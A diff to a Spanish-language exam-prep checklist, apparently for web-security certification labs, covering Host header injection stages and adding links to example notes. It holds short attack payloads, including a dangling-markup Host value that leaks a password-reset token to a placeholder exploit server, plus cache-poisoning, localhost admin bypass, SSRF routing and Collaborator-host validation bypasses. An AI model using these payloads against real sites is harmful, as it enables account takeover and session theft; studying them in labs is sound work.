@@ -24,7 +24,7 @@ tags:
 ## 🟢 Stage 1 — foothold (tomar la cuenta de un user)
 
 - [ ] **Reset de contraseña envenenado:** pedí reset de la víctima y cambiá el `Host` → ¿el link apunta a **tu exploit-server / Collaborator**? Leé el token en el **access log** → reseteás su pass → entrás. *(Lab 2)* → [[vulnerabilities/016-host-header-injection/examples/002-password-reset-poisoning|ej. 002]]
-- [ ] **Dangling markup:** si el `Host` está validado (conserva el dominio) pero el mail es **HTML (template)**, inyectá por el **puerto**: `Host: LAB-ID…:'><img src="//TU-EXPLOIT-SERVER/?` → el `<img>` sin cerrar se traga el token y lo exfiltra. *(Lab 3)*
+- [ ] **Dangling markup:** si el `Host` está validado (conserva el dominio) pero el mail es **HTML (template)**, inyectá por el **puerto**: `Host: LAB-ID…:'><img src="//TU-EXPLOIT-SERVER/?` → el `<img>` sin cerrar se traga el token y lo exfiltra. *(Lab 3)* → [[vulnerabilities/016-host-header-injection/labs/README|labs · #3 dangling markup]]
 - [ ] **Cache poisoning → JS arbitrario:** si el Host se refleja en un `<script src>` **y** la respuesta se **cachea**, mandá **`Host` duplicado** (request ambigua) con el 2º apuntando a tu server → serví un JS que **robe la cookie/apiKey** de quien cargue la home. *(Lab 4 · si el que la carga es un user → S1; si es el admin → S2)* → [[vulnerabilities/016-host-header-injection/examples/003-web-cache-poisoning-host-duplicado|ej. 003]] · [[exam/to-do-list/web-cache-poisoning|web cache poisoning]]
 - [ ] **Host → sink server-side:** ¿el Host se **guarda/loguea** o entra en una **consulta**? probá **SQLi / XSS por el header** para dumpear credenciales de un user. → [[exam/to-do-list/sql-injection|SQLi]]
 
@@ -32,14 +32,14 @@ tags:
 
 - [ ] **Auth bypass del panel "solo local":** `Host: localhost` (o `X-Forwarded-Host: localhost` / `127.0.0.1`) para entrar al `/admin` restringido → acciones de admin. *(Lab 1)* → [[vulnerabilities/016-host-header-injection/examples/001-auth-bypass-host-localhost|ej. 001]]
 - [ ] **Routing-based SSRF a interno:** poné tu **Collaborator** en el `Host` para **confirmar**, después rutéalo al panel interno (`localhost:6566` / `192.168.0.X`) → creá admin / cambiá tu rol / borrá. *(Labs 5-6)* → [[vulnerabilities/016-host-header-injection/examples/004-routing-based-ssrf-interno|ej. 004]] · [[vulnerabilities/007-ssrf/ssrf|SSRF]]
-- [ ] **Delivered contra el admin:** la víctima activa es el **admin** → reset poisoning a **su** cuenta, o cache-poisoning con JS que roba **su** sesión (mismos trucos que S1, otra víctima).
+- [ ] **Delivered contra el admin:** la víctima activa es el **admin** → reset poisoning a **su** cuenta, o cache-poisoning con JS que roba **su** sesión (mismos trucos que S1, otra víctima). → [[vulnerabilities/016-host-header-injection/examples/002-password-reset-poisoning|002]] · [[vulnerabilities/016-host-header-injection/examples/003-web-cache-poisoning-host-duplicado|003]]
 - [ ] **Routing cuando el `Host` está validado:** **URL absoluta** en la request line con `Host` legítimo *(Lab 6)* · **connection-state** (2 requests, 1 conexión) → [[vulnerabilities/016-host-header-injection/scripts/conn_reuse.py|conn_reuse.py]] *(Lab 7)*.
 
 ## ♾️ Independiente del stage
 
-- [ ] Cambiá el `Host` por basura y mirá si **cambia algo** (200 igual, reflejo, redirect, error interno) → si acepta cualquiera, terreno fértil.
-- [ ] Si el `Host` está validado, probá **override headers**: `X-Forwarded-Host` · `X-Host` · `X-Forwarded-Server` · `Forwarded` · **doble `Host`** · **URL absoluta** · **line wrapping**.
-- [ ] **`invalid hostname` con tu Collaborator solo:** si `Host: xxx.oastify.com` es rechazado (el server exige que aparezca el dominio del target), colgá el target como query para que el validador lo vea pero la request salga a tu Collaborator: `Host: xxx.oastify.com?TARGET.net` (o `xxx.oastify.com#TARGET.net` / `xxx.oastify.com/TARGET.net`).
+- [ ] Cambiá el `Host` por basura y mirá si **cambia algo** (200 igual, reflejo, redirect, error interno) → si acepta cualquiera, terreno fértil. → [[vulnerabilities/016-host-header-injection/host-header|entry point]]
+- [ ] Si el `Host` está validado, probá **override headers**: `X-Forwarded-Host` · `X-Host` · `X-Forwarded-Server` · `Forwarded` · **doble `Host`** · **URL absoluta** · **line wrapping**. → [[vulnerabilities/016-host-header-injection/host-header|entry point]]
+- [ ] **`invalid hostname` con tu Collaborator solo:** si `Host: xxx.oastify.com` es rechazado (el server exige que aparezca el dominio del target), colgá el target como query para que el validador lo vea pero la request salga a tu Collaborator: `Host: xxx.oastify.com?TARGET.net` (o `xxx.oastify.com#TARGET.net` / `xxx.oastify.com/TARGET.net`). → [[vulnerabilities/016-host-header-injection/examples/004-routing-based-ssrf-interno|004]]
 - [ ] *(Stage 3)* Inyectá `Host`/`X-Forwarded-Host` para que el server se pegue a su **servicio interno** o a un oastify (SSRF) → [[vulnerabilities/007-ssrf/ssrf|SSRF]].
 
 ## 🔗 Referencias
